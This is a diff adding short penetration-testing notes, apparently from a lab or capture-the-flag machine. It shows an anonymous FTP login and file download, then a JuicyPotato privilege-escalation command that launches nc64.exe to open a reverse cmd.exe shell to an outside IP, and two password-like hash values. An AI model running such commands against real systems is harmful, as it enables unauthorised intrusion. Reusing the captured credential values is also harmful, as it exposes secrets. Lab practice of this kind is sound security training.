@@ -1,0 +1,32 @@
+❯ ftp 10.10.191.173             
+Connected to 10.10.191.173.
+220 Microsoft FTP Service
+Name (10.10.191.173:sherlock-parrot): anonymous
+331 Anonymous access allowed, send identity (e-mail name) as password.
+Password: 
+230 User logged in.
+Remote system type is Windows_NT.
+ftp> ls
+229 Entering Extended Passive Mode (|||49674|)
+150 Opening ASCII mode data connection.
+11-14-20  03:26PM                  173 notice.txt
+226 Transfer complete.
+ftp> get notice.txt
+local: notice.txt remote: notice.txt
+229 Entering Extended Passive Mode (|||49675|)
+150 Opening ASCII mode data connection.
+100% |********************************************************************************************************************************|   173        0.35 KiB/s    00:00 ETA
+226 Transfer complete.
+173 bytes received in 00:00 (0.35 KiB/s)
+ftp> pwd
+Remote directory: /
+ftp> dir
+229 Entering Extended Passive Mode (|||49677|)
+150 Opening ASCII mode data connection.
+11-14-20  03:26PM                  173 notice.txt
+226 Transfer complete.
+ftp> 
+C:\xampp\htdocs\images\JuicyPotato.exe -l 53375 -p c:\windows\system32\cmd.exe -a "/c C:\xampp\htdocs\images\nc64.exe 10.8.34.3 8443 -e cmd.exe" -t *
+
+passwd=B3A8F2D8BEA2F1FA70
+passwd2=00B2CDC0BADCAF1397
